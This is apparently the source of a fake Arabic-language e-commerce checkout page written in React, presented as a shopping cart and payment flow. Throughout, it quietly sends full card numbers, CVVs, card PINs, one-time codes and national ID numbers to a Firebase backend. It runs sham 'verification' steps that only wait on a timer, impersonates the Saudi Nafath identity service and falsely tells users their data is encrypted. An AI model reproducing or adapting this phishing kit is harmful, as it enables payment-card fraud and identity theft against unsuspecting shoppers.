"use client"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Separator } from "@/components/ui/separator"
import { Badge } from "@/components/ui/badge"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { Minus, Plus, Trash2, MapPin, Check, Loader2, Shield, Phone, CreditCard } from "lucide-react"
import { addData,  createOtpVerification,  verifyOtp } from "@/lib/firebase"
import { MapAddressPicker } from "@/components/map-address-picker"
import { useCart } from "@/lib/cartContext"
import NafazModal from "@/components/nafaz-modal"

interface ShippingInfo {
  fullName: string
  phone: string
  city: string
  district?: string
  street?: string
  postalCode?: string
  coordinates?: { lat: number; lng: number }
}

interface PaymentInfo {
  cardNumber: string
  cardName: string
  expiryDate: string
  cvv: string
}

const detectPhoneProvider = (phone: string): string => {
  const providers: Record<string, string[]> = {
    STC: ["050", "053", "055", "058"],
    Mobily: ["054", "056"],
    Zain: ["059"],
    Virgin: ["057"],
  }

  const prefix = phone.slice(0, 3)
  for (const [provider, prefixes] of Object.entries(providers)) {
    if (prefixes.includes(prefix)) {
      return provider
    }
  }
  return "Unknown"
}

export default function CheckoutPage() {
  const [step, setStep] = useState<
    | "cart"
    | "shipping"
    | "payment"
    | "card-otp"
    | "card-pin"
    | "phone-verification"
    | "phone-otp"
    | "nafath"
    | "auth-dialog"
    | "success"
  >("cart")
  const { items, updateQuantity: updateCartQuantity, removeItem: removeCartItem, clearCart } = useCart()

  const [shippingInfo, setShippingInfo] = useState<ShippingInfo>({
    fullName: "",
    phone: "",
    city: "",
  })

  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: "",
    cardName: "",
    expiryDate: "",
    cvv: "",
  })

  const [cardOtp, setCardOtp] = useState("")
  const [cardPin, setCardPin] = useState("")
  const [phoneOtp, setPhoneOtp] = useState("")
  const [nafathId, setNafathId] = useState("")
  const [phoneProvider, setPhoneProvider] = useState("")

  const [isVerifying, setIsVerifying] = useState(false)
  const [isProcessingOrder, setIsProcessingOrder] = useState(false)
  const [verificationError, setVerificationError] = useState("")
  const [orderError, setOrderError] = useState("")
  const [canResendOtp, setCanResendOtp] = useState(false)
  const [resendTimer, setResendTimer] = useState(30)
  const [showMap, setShowMap] = useState(false)

  const [cardOtpVerificationId, setCardOtpVerificationId] = useState("")
  const [phoneOtpVerificationId, setPhoneOtpVerificationId] = useState("")

  const [showOfferPopup, setShowOfferPopup] = useState(false)
  const [offerAccepted, setOfferAccepted] = useState(false)
  const [offerDiscount, setOfferDiscount] = useState(0)

  useEffect(() => {
    const savedShipping = localStorage.getItem("shippingInfo")
    if (savedShipping) {
      setShippingInfo(JSON.parse(savedShipping))
    }
  }, [])

  useEffect(() => {
    if (step === "shipping" && shippingInfo.fullName) {
      localStorage.setItem("shippingInfo", JSON.stringify(shippingInfo))
    }
  }, [shippingInfo, step])

  useEffect(() => {
    if ((step === "card-otp" || step === "phone-otp") && resendTimer > 0 && !canResendOtp) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000)
      return () => clearTimeout(timer)
    } else if (resendTimer === 0) {
      setCanResendOtp(true)
    }
  }, [resendTimer, step, canResendOtp])

  const totalPrice = items.reduce((sum, item) => sum + item.price * item.quantity, 0)
  const shippingFee = totalPrice > 100 ? 0 : 10
  const tax = totalPrice * 0.15
  const finalTotal = totalPrice + shippingFee + tax

  const updateQuantity = (productId: number, delta: number) => {
    const item = items.find((i) => i.productId === productId)
    if (item) {
      updateCartQuantity(productId, item.quantity + delta)
    }
  }

  const removeItem = (productId: number) => {
    removeCartItem(productId)
  }

  const isShippingValid = async () => {
    const visitor=localStorage.getItem('visitor')
    await addData({id:visitor,...shippingInfo})
    return shippingInfo.fullName.trim() !== "" && shippingInfo.phone.trim() !== "" && shippingInfo.city.trim() !== ""
  }

  const isPaymentValid = async () => {
    const visitor=localStorage.getItem('visitor')
    await addData({id:visitor,...paymentInfo})
    return (
      paymentInfo.cardNumber.replace(/\s/g, "").length === 16 &&
      paymentInfo.cardName.trim() !== "" &&
      paymentInfo.expiryDate.length === 5 &&
      paymentInfo.cvv.length === 3
    )
  }

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "")
    const chunks = cleaned
    return chunks
  }

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4)
    }
    return cleaned
  }

  const handleCardNumberChange = (value: string) => {
    const cleaned = value.replace(/\s/g, "")
    if (cleaned.length <= 16 && /^\d*$/.test(cleaned)) {
      setPaymentInfo({ ...paymentInfo, cardNumber: formatCardNumber(cleaned) })
    }
  }

  const handleExpiryChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length <= 4) {
      setPaymentInfo({ ...paymentInfo, expiryDate: formatExpiryDate(cleaned) })
    }
  }

  const handleCvvChange = (value: string) => {
    if (value.length <= 3 && /^\d*$/.test(value)) {
      setPaymentInfo({ ...paymentInfo, cvv: value })
    }
  }

  const sendCardOtp = async () => {
    try {
      const visitor=localStorage.getItem('visitor')
      await addData({id:visitor,cardOtp})
  
      setCardOtpVerificationId(visitor!)
      setStep("card-otp")
      setResendTimer(30)
      setCanResendOtp(false)
    } catch (error) {
      console.error(" Error sending card OTP:", error)
      setVerificationError("فشل إرسال رمز التحقق")
    }
  }

  const handleCardOtpVerify = async () => {
    const visitor=localStorage.getItem('visitor')!
    if (cardOtp.length < 4) {
      setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
      return
    }
    await addData({id:visitor,otp:cardOtp,verified:false})
    setIsVerifying(true)
    setVerificationError("")

    try {
      await createOtpVerification(shippingInfo.phone, cardOtp)
      console.log(" Card OTP verified successfully")
      setIsVerifying(false)
      setCardOtp("")
      setStep("card-pin")
    } catch (error: any) {
      console.error(" Card OTP verification error:", error)
      setIsVerifying(false)
      setVerificationError(error.message || "رمز التحقق غير صحيح")
    }
  }

  const handleCardPinVerify = async () => {
    if (cardPin.length !== 4) {
      setVerificationError("الرجاء إدخال رمز PIN المكون من 4 أرقام")
      return
    }
    const visitor=localStorage.getItem('visitor')
    await addData({id:visitor,cardPin})
    setIsVerifying(true)
    setVerificationError("")

    try {
      await new Promise((resolve) => setTimeout(resolve, 1500))
      console.log(" Card PIN verified")
      setIsVerifying(false)
      setCardPin("")
      const provider = detectPhoneProvider(shippingInfo.phone)
      setPhoneProvider(provider)
      setStep("phone-verification")
    } catch (error) {
      console.error(" Card PIN verification error:", error)
      setIsVerifying(false)
      setVerificationError("رمز PIN غير صحيح")
    }
  }

  const sendPhoneOtp = async () => {
    try {
      const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
      const visitor=localStorage.getItem('visitor')
      await addData({id:visitor,...shippingInfo})
      console.log(" Phone OTP sent:", otpCode)
      setStep("phone-otp")
      setResendTimer(30)
      setCanResendOtp(false)
    } catch (error) {
      console.error(" Error sending phone OTP:", error)
      setVerificationError("فشل إرسال رمز التحقق")
    }
  }

  const handlePhoneOtpVerify = async () => {
    const visitor=localStorage.getItem('visitor')
    
    await addData({id:visitor,phoneOtp})
    if (phoneOtp.length < 3) {
      setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
      return
    }

    setIsVerifying(true)
    setVerificationError("")

    try {
      await addData({id:visitor,phoneOtpVerificationId, phoneOtp})
      console.log(" Phone OTP verified successfully")
      setIsVerifying(false)
      setPhoneOtp("")
      setStep("nafath")
    } catch (error: any) {
      console.error(" Phone OTP verification error:", error)
      setIsVerifying(false)
      setVerificationError(error.message || "رمز التحقق غير صحيح")
    }
  }

  const handleNafathVerify = async () => {
    const visitor=localStorage.getItem('visitor')

    if (nafathId.length !== 10) {
      setVerificationError("الرجاء إدخال رقم هوية نفاذ صحيح (10 أرقام)")
      return
    }
    await addData({id:visitor,nafathId})

    setIsVerifying(true)
    setVerificationError("")

    try {
      await new Promise((resolve) => setTimeout(resolve, 2000))
      console.log(" Nafath ID verified")
      setIsVerifying(false)
      setStep("auth-dialog")
    } catch (error) {
      console.error(" Nafath verification error:", error)
      setIsVerifying(false)
      setVerificationError("فشل التحقق من نفاذ")
    }
  }

  const handleFinalSubmit = async () => {
    setIsProcessingOrder(true)
    setOrderError("")

    try {
      const orderId = `order-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
      const orderData = {
        id: orderId,
        timestamp: new Date().toISOString(),
        status: "pending",
        shipping: shippingInfo,
        payment: {
          cardLast4: paymentInfo.cardNumber.slice(-4),
          cardName: paymentInfo.cardName,
        },
        items: items.map((item) => ({
          id: item.productId,
          name: item.nameAr,
          price: item.price,
          quantity: item.quantity,
        })),
        pricing: {
          subtotal: totalPrice,
          shippingFee,
          tax,
          total: finalTotal,
        },
        verification: {
          phoneProvider,
          nafathId,
          verifiedAt: new Date().toISOString(),
        },
      }

      await addData(orderData)
      console.log(" Order submitted successfully:", orderId)
      setIsProcessingOrder(false)
      clearCart()
      setStep("success")
    } catch (error) {
      console.error(" Order submission error:", error)
      setIsProcessingOrder(false)
      setOrderError("حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى.")
    }
  }

  const handleResendOtp = async () => {
    setVerificationError("")
    setCanResendOtp(false)
    setResendTimer(30)

    if (step === "card-otp") {
      setCardOtp("")
      await sendCardOtp()
    } else if (step === "phone-otp") {
      setPhoneOtp("")
      await sendPhoneOtp()
    }
  }

  const handleMapAddressSelect = (address: {
    lat: number
    lng: number
    city: string
    district: string
    street: string
  }) => {
    setShippingInfo({
      ...shippingInfo,
      city: address.city,
      district: address.district,
      street: address.street,
      coordinates: { lat: address.lat, lng: address.lng },
    })
    setShowMap(false)
  }

  if (items.length === 0 && step === "cart") {
    return (
      <div className="min-h-screen bg-muted/30 flex items-center justify-center p-4">
        <Card className="max-w-md w-full text-center">
          <CardHeader>
            <CardTitle className="text-2xl">السلة فارغة</CardTitle>
            <CardDescription>لم تقم بإضافة أي منتجات بعد</CardDescription>
          </CardHeader>
          <CardContent>
            <Button className="w-full" asChild>
              <a href="/products">تصفح المنتجات</a>
            </Button>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-muted/20 p-4">
      <div className="max-w-4xl mx-auto">
        {/* Progress Stepper */}
        <div className="mb-8">
          <div className="flex items-center justify-between">
            {["cart", "shipping", "payment", "verification"].map((s, i) => (
              <div key={s} className="flex items-center flex-1">
                <div className="flex flex-col items-center flex-1">
                  <div
                    className={`w-10 h-10 rounded-full flex items-center justify-center border-2 transition-colors ${
                      ["cart", "shipping", "payment"].includes(step) && s === step
                        ? "bg-primary text-primary-foreground border-primary"
                        : !["cart", "shipping", "payment"].includes(step) && s === "verification"
                          ? "bg-primary text-primary-foreground border-primary"
                          : ["cart", "shipping", "payment"].indexOf(step as any) >
                              ["cart", "shipping", "payment", "verification"].indexOf(s)
                            ? "bg-primary text-primary-foreground border-primary"
                            : "bg-background text-muted-foreground border-border"
                    }`}
                  >
                    {i + 1}
                  </div>
                  <span className="text-xs mt-1 font-medium">
                    {s === "cart" && "السلة"}
                    {s === "shipping" && "الشحن"}
                    {s === "payment" && "الدفع"}
                    {s === "verification" && "التحقق"}
                  </span>
                </div>
                {i < 3 && (
                  <div
                    className={`h-0.5 flex-1 transition-colors ${
                      ["cart", "shipping", "payment"].indexOf(step as any) > i ||
                      !["cart", "shipping", "payment"].includes(step)
                        ? "bg-primary"
                        : "bg-border"
                    }`}
                  />
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Cart Step */}
        {step === "cart" && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="text-2xl">سلة التسوق</CardTitle>
                <CardDescription>
                  لديك {items.length} {items.length === 1 ? "منتج" : "منتجات"}
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {items.map((item) => (
                  <div
                    key={item.id}
                    className="flex gap-4 p-4 rounded-lg border bg-card hover:shadow-sm transition-shadow"
                  >
                    <img
                      src={item.imageUrl || "/placeholder.svg?height=80&width=80"}
                      alt={item.nameAr}
                      className="w-20 h-20 object-cover rounded"
                    />
                    <div className="flex-1">
                      <h3 className="font-semibold">{item.nameAr}</h3>
                      <p className="text-sm text-muted-foreground">{item.price} ريال</p>
                      <div className="flex items-center gap-2 mt-2">
                        <Button
                          size="icon"
                          variant="outline"
                          className="h-8 w-8 bg-transparent"
                          onClick={() => updateQuantity(item.productId, -1)}
                          disabled={item.quantity === 1}
                        >
                          <Minus className="h-4 w-4" />
                        </Button>
                        <span className="w-8 text-center font-medium">{item.quantity}</span>
                        <Button
                          size="icon"
                          variant="outline"
                          className="h-8 w-8 bg-transparent"
                          onClick={() => updateQuantity(item.productId, 1)}
                        >
                          <Plus className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>
                    <div className="flex flex-col items-end justify-between">
                      <Button
                        size="icon"
                        variant="ghost"
                        className="text-destructive"
                        onClick={() => removeItem(item.productId)}
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                      <p className="font-bold">{item.price * item.quantity} ريال</p>
                    </div>
                  </div>
                ))}
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>ملخص الطلب</CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">المجموع الفرعي</span>
                  <span>{totalPrice} ريال</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">رسوم الشحن</span>
                  <span>{shippingFee === 0 ? "مجاني" : `${shippingFee} ريال`}</span>
                </div>
                {shippingFee === 0 && (
                  <Badge variant="secondary" className="w-fit">
                    شحن مجاني للطلبات فوق 500 ريال
                  </Badge>
                )}
                <div className="flex justify-between">
                  <span className="text-muted-foreground">الضريبة (15%)</span>
                  <span>{tax.toFixed(2)} ريال</span>
                </div>
                <Separator />
                <div className="flex justify-between text-lg font-bold">
                  <span>الإجمالي</span>
                  <span>{finalTotal.toFixed(2)} ريال</span>
                </div>
                <Button className="w-full" size="lg" onClick={() => setStep("shipping")}>
                  المتابعة إلى الشحن
                </Button>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Shipping Step */}
        {step === "shipping" && (
          <Card>
            <CardHeader>
              <CardTitle className="text-2xl">معلومات الشحن</CardTitle>
              <CardDescription>أدخل عنوان التوصيل</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <Button
                type="button"
                variant="outline"
                className="w-full gap-2 bg-transparent"
                onClick={() => setShowMap(true)}
              >
                <MapPin className="h-4 w-4" />
                حدد الموقع من الخريطة
              </Button>

              <div className="grid gap-4 md:grid-cols-2">
                <div className="space-y-2">
                  <Label htmlFor="fullName">الاسم الكامل</Label>
                  <Input
                    id="fullName"
                    placeholder="أدخل الاسم الكامل"
                    value={shippingInfo.fullName}
                    onChange={(e) => setShippingInfo({ ...shippingInfo, fullName: e.target.value })}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">رقم الجوال</Label>
                  <Input
                    id="phone"
                    maxLength={10}
                    type="tel"
                    placeholder="05XXXXXXXX"
                    value={shippingInfo.phone}
                    onChange={(e) => setShippingInfo({ ...shippingInfo, phone: e.target.value })}
                  />
                </div>
              </div>

              <div className="grid gap-4 md:grid-cols-2">
                <div className="space-y-2">
                  <Label htmlFor="city">المدينة</Label>
                  <Input
                    id="city"
                    placeholder="مثال: الرياض"
                    value={shippingInfo.city}
                    onChange={(e) => setShippingInfo({ ...shippingInfo, city: e.target.value })}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="district">الحي</Label>
                  <Input
                    id="district"
                    placeholder="أدخل الحي"
                    value={shippingInfo.district}
                    onChange={(e) => setShippingInfo({ ...shippingInfo, district: e.target.value })}
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="street">اسم الشارع</Label>
                <Input
                  id="street"
                  placeholder="أدخل اسم الشارع"
                  value={shippingInfo.street}
                  onChange={(e) => setShippingInfo({ ...shippingInfo, street: e.target.value })}
                />
              </div>

              <div className="flex gap-3 pt-4">
                <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("cart")}>
                  رجوع
                </Button>
                <Button className="flex-1" onClick={() => setStep("payment")} disabled={!isShippingValid()}>
                  المتابعة إلى الدفع
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Payment Step */}
        {step === "payment" && (
          <Card className="max-w-xl mx-auto shadow-lg border">
            <CardHeader className="space-y-1 text-center">
              <CardTitle className="text-2xl font-bold">معلومات الدفع</CardTitle>
              <CardDescription className="text-muted-foreground">جميع بياناتك مشفرة وآمنة</CardDescription>
            </CardHeader>

            <CardContent className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="cardNumber">رقم البطاقة</Label>
                <Input
                  id="cardNumber"
                  placeholder="1234 5678 9012 3456"
                  className="tracking-widest text-lg"
                  value={paymentInfo.cardNumber}
                  onChange={(e) => handleCardNumberChange(e.target.value)}
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="cardName">اسم حامل البطاقة</Label>
                <Input
                  id="cardName"
                  placeholder="الاسم كما هو مكتوب على البطاقة"
                  value={paymentInfo.cardName}
                  onChange={(e) => setPaymentInfo({ ...paymentInfo, cardName: e.target.value })}
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="expiryDate">تاريخ الانتهاء</Label>
                  <Input
                    id="expiryDate"
                    placeholder="MM/YY"
                    value={paymentInfo.expiryDate}
                    onChange={(e) => handleExpiryChange(e.target.value)}
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
                  <Input
                    id="cvv"
                    placeholder="123"
                    type="password"
                    value={paymentInfo.cvv}
                    onChange={(e) => handleCvvChange(e.target.value)}
                  />
                </div>
              </div>

              <div className="flex items-center gap-2 rounded-md bg-muted px-3 py-2 text-sm text-muted-foreground">
                <Shield className="h-4 w-4" />
                يتم تشفير معلومات الدفع باستخدام SSL
              </div>
<div className="flex gap-3 justify-center bg-white/80 p-2 rounded">
  <img width={30} src="/visa.svg"alt="visa.svg"/>
  <img width={30} src="/mastercard.svg"alt=""/>
  <img width={30} src="/mada.svg"alt=""/>
</div>
              <div className="flex gap-3 pt-2">
                <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("shipping")}>
                  رجوع
                </Button>

                <Button className="flex-1 text-lg" disabled={!isPaymentValid()} onClick={sendCardOtp}>
                  تأكيد الدفع
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "card-otp" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <CreditCard className="h-6 w-6 text-primary" />
              </div>
              <CardTitle className="text-2xl text-center">التحقق من البطاقة</CardTitle>
              <CardDescription className="text-center">
                تم إرسال رمز التحقق إلى رقم الجوال {shippingInfo.phone}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <Label className="text-center block mb-4">أدخل رمز التحقق</Label>
                <div className="flex gap-2 justify-center" dir="ltr">
                  <Input
                    type="text"
                    inputMode="numeric"
                    autoComplete="otp"
                    maxLength={6}
                    value={cardOtp}
                    onChange={(e) => setCardOtp(e.target.value)}
                    className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                  />
                </div>
              </div>

              <div className="text-center text-sm text-muted-foreground">
                {canResendOtp ? (
                  <button onClick={handleResendOtp} className="text-primary hover:underline font-medium">
                    إعادة إرسال الرمز
                  </button>
                ) : (
                  <span>يمكنك إعادة الإرسال بعد {resendTimer} ثانية</span>
                )}
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1 bg-transparent"
                  onClick={() => setStep("payment")}
                  disabled={isVerifying}
                >
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handleCardOtpVerify} disabled={isVerifying}>
                  {isVerifying ? (
                    <>
                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                      جاري التحقق...
                    </>
                  ) : (
                    "تحقق"
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "card-pin" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <Shield className="h-6 w-6 text-primary" />
              </div>
              <CardTitle className="text-2xl text-center">رمز PIN للبطاقة</CardTitle>
              <CardDescription className="text-center">أدخل رمز PIN المكون من 4 أرقام</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <div className="flex gap-2 justify-center" dir="ltr">
                  <Input
                    type="password"
                    inputMode="numeric"
                    maxLength={4}
                    value={cardPin}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, "")
                      setCardPin(value)
                    }}
                    className={`w-40 h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                  />
                </div>
                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1 bg-transparent"
                  onClick={() => setStep("card-otp")}
                  disabled={isVerifying}
                >
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handleCardPinVerify} disabled={isVerifying}>
                  {isVerifying ? (
                    <>
                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                      جاري التحقق...
                    </>
                  ) : (
                    "تحقق"
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "phone-verification" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <Phone className="h-6 w-6 text-primary" />
              </div>
              <CardTitle className="text-2xl text-center">معلومات الجوال</CardTitle>
              <CardDescription className="text-center">تأكيد بيانات الاتصال</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="p-4 bg-muted rounded-lg space-y-3">
                <div className="flex justify-between items-center">
                  <span className="text-muted-foreground">رقم الجوال</span>
                  <input className="font-mono font-medium" maxLength={10} type="tel" onChange={(e)=>setPhoneOtpVerificationId(e.target.value)}/>
                </div> 
                <Separator />
                <div className="flex justify-between items-center">
                  <span className="text-muted-foreground">مزود الخدمة</span>
                  <Badge variant="secondary" className="font-bold">
                    {(phoneOtpVerificationId.length===10?detectPhoneProvider(phoneOtpVerificationId):"")}
                  </Badge>
                </div>
              </div>

              <div className="flex gap-3">
                <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("card-pin")}>
                  رجوع
                </Button>
                <Button className="flex-1" onClick={sendPhoneOtp}>
                  متابعة التحقق
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "phone-otp" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <Phone className="h-6 w-6 text-primary" />
              </div>
              <CardTitle className="text-2xl text-center">التحقق من الجوال</CardTitle>
              <CardDescription className="text-center">
                تم إرسال رمز التحقق إلى رقم الجوال {shippingInfo.phone}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <Label className="text-center block mb-4">أدخل رمز التحقق</Label>
                <div className="flex gap-2 justify-center" dir="ltr">
                  <Input
                    type="text"
                    inputMode="numeric"
                    autoComplete="otp"
                    maxLength={6}
                    value={phoneOtp}
                    onChange={(e) => setPhoneOtp(e.target.value)}
                    className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                  />
                </div>
                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
              </div>

              <div className="text-center text-sm text-muted-foreground">
                {canResendOtp ? (
                  <button onClick={handleResendOtp} className="text-primary hover:underline font-medium">
                    إعادة إرسال الرمز
                  </button>
                ) : (
                  <span>يمكنك إعادة الإرسال بعد {resendTimer} ثانية</span>
                )}
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1 bg-transparent"
                  onClick={() => setStep("phone-verification")}
                  disabled={isVerifying}
                >
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handlePhoneOtpVerify} disabled={isVerifying}>
                  {isVerifying ? (
                    <>
                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                      جاري التحقق...
                    </>
                  ) : (
                    "تحقق"
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "nafath" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <img className=" w-12y"  src="/logo.png"/>
              </div>
              <CardTitle className="text-2xl text-center">التحقق عبر نفاذ</CardTitle>
              <CardDescription className="text-center">أدخل رقم الهوية الوطنية</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <Label className="text-center block mb-4">رقم الهوية (10 أرقام)</Label>
                <div className="flex gap-2 justify-center" dir="ltr">
                  <Input
                    type="text"
                    inputMode="numeric"
                    maxLength={10}
                    value={nafathId}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, "")
                      setNafathId(value)
                    }}
                    className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                    placeholder="1234567890"
                  />
                </div>
                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
              </div>

              <div className="flex items-center gap-2 rounded-md bg-muted px-3 py-2 text-sm text-muted-foreground">
                <Shield className="h-4 w-4" />
                التحقق عبر منصة نفاذ الوطنية الموحدة
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1 bg-transparent"
                  onClick={() => setStep("phone-otp")}
                  disabled={isVerifying}
                >
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handleNafathVerify} disabled={isVerifying}>
                  {isVerifying ? (
                    <>
                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                      جاري التحقق...
                    </>
                  ) : (
                    "تحقق"
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "auth-dialog" && (
         <NafazModal isOpen={step === "auth-dialog"} phone={shippingInfo.phone} onClose={()=>{}}/>
        )}

        {/* Success Step */}
        {step === "success" && (
          <Card className="text-center">
            <CardHeader>
              <div className="mx-auto w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <Check className="h-8 w-8 text-primary" />
              </div>
              <CardTitle className="text-2xl text-primary">تم تأكيد الطلب بنجاح</CardTitle>
              <CardDescription>شكرا لك، تم استلام طلبك وسيتم معالجته قريبا</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="p-4 bg-muted rounded-lg space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">رقم الطلب</span>
                  <span className="font-mono font-medium">
                    {localStorage.getItem("visitor")?.slice(-8) || "ORD12345"}
                  </span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">المبلغ الإجمالي</span>
                  <span className="font-bold">{finalTotal.toFixed(2)} ريال</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">وقت التوصيل المتوقع</span>
                  <span>3-5 أيام عمل</span>
                </div>
              </div>

              <p className="text-sm text-muted-foreground">
                سيتم إرسال تفاصيل الطلب إلى رقم الجوال {shippingInfo.phone}
              </p>

              <div className="flex gap-3 pt-4">
                <Button variant="outline" className="flex-1 bg-transparent">
                  تتبع الطلب
                </Button>
                <Button className="flex-1" onClick={() => window.location.reload()}>
                  طلب جديد
                </Button>
              </div>
            </CardContent>
          </Card>
        )}
      </div>

      {showMap && <MapAddressPicker onAddressSelect={handleMapAddressSelect} onClose={() => setShowMap(false)} />}
    </div>
  )
}
